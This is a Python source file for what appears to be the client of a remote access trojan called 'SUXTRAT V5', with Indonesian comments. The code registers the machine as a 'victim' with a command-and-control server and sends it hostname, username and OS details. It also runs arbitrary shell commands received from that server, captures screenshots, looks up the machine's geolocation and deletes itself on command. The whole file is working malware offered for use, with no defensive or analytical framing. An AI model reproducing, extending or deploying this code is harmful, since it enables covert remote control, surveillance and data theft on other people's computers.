#!/usr/bin/env python3
# OSKAC REX — SUXTRAT V5 CLIENT (WINDOWS COMPATIBLE)

import subprocess
import platform
import socket
import requests
import json
import time
import os
import sys

# ============ KONFIGURASI ============
C2_SERVER = "http://127.0.0.1:5000"  # Ganti dengan IP server Anda
VICTIM_ID = socket.gethostname() + "_" + str(os.getpid())
BEACON_INTERVAL = 10
# ====================================

running = True

def get_system_info():
    return {
        'victim_id': VICTIM_ID,
        'os': f"{platform.system()} {platform.release()}",
        'hostname': socket.gethostname(),
        'user': os.getenv('USERNAME'),
        'arch': platform.machine()
    }

def execute_command(cmd):
    try:
        if cmd == 'screenshot':
            return take_screenshot()
        elif cmd == 'location':
            return get_location()
        elif cmd == 'self_destruct':
            return self_destruct()
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr if result.stdout else result.stderr
    except Exception as e:
        return f"Error: {str(e)}"

def take_screenshot():
    try:
        import pyscreenshot as ImageGrab
        import base64
        import io
        img = ImageGrab.grab()
        buffered = io.BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return f"[SCREENSHOT_BASE64] {img_str[:100]}..."
    except:
        return "Screenshot failed (install: pip install pyscreenshot)"

def get_location():
    try:
        response = requests.get('http://ip-api.com/json/', timeout=5)
        data = response.json()
        return f"IP: {data.get('query')}, City: {data.get('city')}, Country: {data.get('country')}, Lat: {data.get('lat')}, Lon: {data.get('lon')}"
    except:
        return "Location unavailable"

def self_destruct():
    global running
    running = False
    try:
        os.remove(sys.argv[0])
    except:
        pass
    return "Self destruct initiated"

def send_result(command_id, result):
    try:
        requests.post(f"{C2_SERVER}/api/result/update", json={
            'command_id': command_id,
            'result': result,
            'victim_id': VICTIM_ID
        }, timeout=5)
    except:
        pass

def beacon():
    while running:
        try:
            response = requests.post(f"{C2_SERVER}/api/beacon", json=get_system_info(), timeout=10)
            if response.status_code == 200:
                data = response.json()
                for cmd in data.get('commands', []):
                    print(f"[*] Executing: {cmd['command']}")
                    result = execute_command(cmd['command'])
                    send_result(cmd['id'], result)
                    print(f"[*] Result sent")
        except Exception as e:
            print(f"Beacon error: {e}")
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    print(f"[+] SUXTRAT V5 Running")
    print(f"[+] ID: {VICTIM_ID}")
    print(f"[+] C2 Server: {C2_SERVER}")
    print(f"[+] Target OS: {get_system_info()['os']}")
    print(f"[+] Waiting for commands...")
    beacon()